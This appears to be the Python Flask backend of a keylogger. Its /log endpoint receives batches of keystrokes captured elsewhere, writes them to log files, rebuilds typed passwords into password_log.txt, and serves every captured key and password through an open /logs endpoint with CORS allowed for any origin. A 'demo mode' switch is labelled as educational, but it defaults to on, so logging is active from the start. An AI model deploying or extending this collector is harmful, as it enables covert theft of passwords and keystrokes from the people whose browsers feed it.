from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime

app = Flask(__name__)
CORS(app)

all_keys = []
password_keys = []
previous_password_value = ""

demo_mode = True  # ✅ default ON

@app.route('/log', methods=['POST'])
def log_keystroke():
    global previous_password_value

    # ✅ If demo_mode is OFF, ignore logging
    if not demo_mode:
        return jsonify({"message": "Demo mode OFF. Keystrokes not logged."}), 200

    data = request.get_json()
    batch = data.get("batch", [])

    for entry in batch:
        key = entry.get("key")
        source = entry.get("source", "general")
        full_value = entry.get("fullValue", "")

        all_keys.append(key)

        # Save raw log
        with open("all_keys_log.txt", "a") as f:
            f.write(f"{key} ")

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open("keystrokes_history.txt", "a") as f_hist:
            f_hist.write(f"{timestamp} - Key: {key} (Source: {source})\n")

        if source == "password" and full_value != previous_password_value:
            previous_password_value = full_value
            password_keys.clear()
            password_keys.extend(list(full_value))
            with open("password_log.txt", "w") as f_pw:
                f_pw.write("".join(password_keys))

    return jsonify({"message": "Batch logged"}), 200

@app.route('/logs', methods=['GET'])
def get_logs():
    return jsonify({
        "all": all_keys,
        "password": password_keys,
        "demoMode": demo_mode
    })

@app.route('/demo-mode', methods=['POST'])
def toggle_demo_mode():
    global demo_mode
    data = request.get_json()
    demo_mode = data.get("demoMode", True)
    return jsonify({"message": f"Demo mode set to {demo_mode}."})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=True)
